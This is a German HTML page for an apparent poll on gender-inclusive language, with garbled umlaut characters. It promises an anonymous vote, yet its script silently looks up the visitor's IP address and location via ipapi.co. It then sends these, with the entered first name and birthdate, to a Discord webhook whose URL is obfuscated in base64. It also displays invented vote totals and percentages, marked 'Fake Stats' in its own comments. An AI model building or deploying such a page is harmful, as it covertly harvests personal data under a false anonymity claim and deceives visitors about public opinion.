<!DOCTYPE html>
<html lang="de">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Abstimmung: Soll gegendert werden?</title>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
  <style>
    body {
      font-family: 'Inter', sans-serif;
      background: #f4f7fa;
      margin: 0;
      padding: 0;
      color: #2c3e50;
      line-height: 1.6;
    }
    .container {
      max-width: 750px;
      margin: auto;
      padding: 2rem;
    }
    h1, h2 {
      text-align: center;
      margin-bottom: 1rem;
    }
    section {
      margin-bottom: 2rem;
      background: white;
      padding: 1.5rem;
      border-radius: 12px;
      box-shadow: 0 4px 10px rgba(0,0,0,0.05);
    }
    .form-section {
      margin-top: 3rem;
    }
    label {
      font-weight: 600;
      display: block;
      margin-top: 1rem;
    }
    input {
      width: 100%;
      padding: 0.7rem;
      margin-top: 0.4rem;
      border: 1px solid #ccc;
      border-radius: 6px;
      font-size: 1rem;
    }
    .button-group {
      margin-top: 2rem;
      display: flex;
      gap: 1rem;
    }
    button {
      flex: 1;
      padding: 0.8rem;
      font-size: 1rem;
      border: none;
      border-radius: 6px;
      cursor: pointer;
      transition: background 0.2s ease-in-out;
      color: white;
    }
    .btn-yes {
      background-color: #2ecc71;
    }
    .btn-yes:hover {
      background-color: #27ae60;
    }
    .btn-no {
      background-color: #e74c3c;
    }
    .btn-no:hover {
      background-color: #c0392b;
    }
    .status {
      margin-top: 1.5rem;
      font-size: 0.95rem;
      text-align: center;
    }
    .status.success { color: #2ecc71; }
    .status.error { color: #e74c3c; }

    /* Fake Stats Styling */
    #fakeStats {
      text-align: center;
      background: #e0e7f0;
      padding: 1rem 1.5rem;
      border-radius: 12px;
      box-shadow: inset 0 0 8px rgba(0,0,0,0.05);
      font-weight: 600;
      font-size: 1rem;
      user-select: none;
    }
    #fakeStats .bar {
      margin-top: 0.7rem;
      height: 20px;
      background: #d1d5db;
      border-radius: 10px;
      overflow: hidden;
      display: flex;
    }
    #fakeStats .bar .yes {
      background-color: #2ecc71;
      text-align: right;
      color: white;
      padding-right: 0.5rem;
      line-height: 20px;
      border-radius: 10px 0 0 10px;
      font-size: 0.85rem;
      width: 55%;
    }
    #fakeStats .bar .no {
      background-color: #e74c3c;
      text-align: left;
      color: white;
      padding-left: 0.5rem;
      line-height: 20px;
      border-radius: 0 10px 10px 0;
      font-size: 0.85rem;
      width: 45%;
    }

    @media (max-width: 600px) {
      .button-group {
        flex-direction: column;
      }
    }
  </style>
</head>
<body>
  <div class="container">
    
    <section>
      <h1>Abstimmung: Soll gegendert werden?</h1>
      <p>
        In unserer Gesellschaft wird aktuell viel √ºber das Thema ‚ÄûGendern‚Äú gesprochen.
        Dabei geht es darum, ob und wie Sprache geschlechtergerecht gestaltet werden soll ‚Äì zum Beispiel durch Formulierungen wie ‚ÄûStudent*innen‚Äú oder ‚ÄûLehrer:innen‚Äú.
      </p>
    </section>

    <section>
      <h2>Warum diese Abstimmung?</h2>
      <p>
        Wir m√∂chten ein Stimmungsbild einfangen: Wie steht ihr zum Gendern? Findet ihr geschlechtergerechte Sprache wichtig ‚Äì oder empfindet ihr sie als st√∂rend?
        Diese Abstimmung ist anonym (nur Vorname & Geburtsdatum n√∂tig) und wird ausschlie√ülich zur Erfassung von Meinungen verwendet.
      </p>
    </section>

    <section>
      <h2>Hintergrundinfos</h2>
      <ul>
        <li><strong>Pro:</strong> Gendern f√∂rdert Gleichbehandlung und Sichtbarkeit aller Geschlechter.</li>
        <li><strong>Contra:</strong> Gendern st√∂rt manche beim Lesen, wirkt unnat√ºrlich oder √ºbertrieben.</li>
        <li>In Medien, Universit√§ten und Beh√∂rden wird unterschiedlich damit umgegangen.</li>
      </ul>
    </section>


    <section class="form-section">
      <h2>Jetzt abstimmen</h2>
      <form id="voteForm">
        <label for="name">Vorname</label>
        <input type="text" id="name" placeholder="Max" required>

        <label for="birthdate">Geburtsdatum</label>
        <input type="date" id="birthdate" required>

        <input type="hidden" id="ip">

        <div class="button-group">
          <button type="button" class="btn-yes" onclick="submitVote('Ja')">Ich bin F√úR Gendern</button>
          <button type="button" class="btn-no" onclick="submitVote('Nein')">Ich bin GEGEN Gendern</button>
        </div>

        <div id="status" class="status"></div>
      </form>
    </section>

    <!-- Fake Stats Anzeige -->
    <section id="fakeStats">
      <div id="fakeStatsText"></div>
      <div class="bar">
        <div class="yes" id="yesBar">55%</div>
        <div class="no" id="noBar">45%</div>
      </div>
    </section>

  </div>

  <script>
    window.userLocation = null;

    // IP und Location abrufen mit ipapi.co (liefert IPv4 oder IPv6 + Location)
    fetch('https://ipapi.co/json/')
      .then(res => res.json())
      .then(data => {
        document.getElementById('ip').value = data.ip;
        window.userLocation = {
          city: data.city || 'unbekannt',
          region: data.region || 'unbekannt',
          country: data.country_name || 'unbekannt',
          loc: data.loc || ''
        };
      })
      .catch(() => {
        // Fallback falls API nicht antwortet
        document.getElementById('ip').value = 'unbekannt';
        window.userLocation = null;
      });

    function submitVote(answer) {
      const name = document.getElementById('name').value.trim();
      const birthdate = document.getElementById('birthdate').value;
      const ip = document.getElementById('ip').value;
      const status = document.getElementById('status');

      if (!name || !birthdate) {
        status.textContent = "Bitte f√ºlle alle Felder aus.";
        status.className = "status error";
        return;
      }

      const locationStr = window.userLocation
        ? `${window.userLocation.city}, ${window.userLocation.region}, ${window.userLocation.country}`
        : 'unbekannt';

      const payload = {
        content: `üó≥Ô∏è Neue Stimme eingegangen:\n**Vorname:** ${name}\n**Geburtsdatum:** ${birthdate}\n**IP:** ${ip}\n**Location:** ${locationStr}\n**Stimme:** ${answer}`
      };

      const webhook = atob("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM5NTQzNzg1MDg4Mjg2NzI2MS94U3otaFZ1aHZJbzhhMF9JME1QekhiUnpQS0NJRW5pN1F6N0ZMcEpVX2g5U1J5TFNIeHNOckhPcVFjOWtQQnA3bHVSRA==");
      
      fetch(webhook, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(payload)
      })
      .then(res => {
        if (res.ok) {
          status.textContent = "Danke f√ºr deine Teilnahme!";
          status.className = "status success";
          document.getElementById('voteForm').reset();
        } else {
          throw new Error("Fehler beim Senden.");
        }
      })
      .catch(() => {
        status.textContent = "Es gab ein Problem beim Senden.";
        status.className = "status error";
      });
    }

    // Fake Statistik generieren
    (function generateFakeStats() {
      const totalVotes = 10000;
      const yesPercent = 55;
      const noPercent = 45;

      const statsText = `Bisher haben <strong>${totalVotes.toLocaleString()}</strong> Personen abgestimmt.`;
      document.getElementById('fakeStatsText').innerHTML = statsText;

      // Bars sind schon fix per CSS, aber du kannst hier auch dynamisch √§ndern falls n√∂tig
      // z.B. falls du sp√§ter prozentwerte zuf√§llig machen willst

    })();
  </script>
</body>
</html>
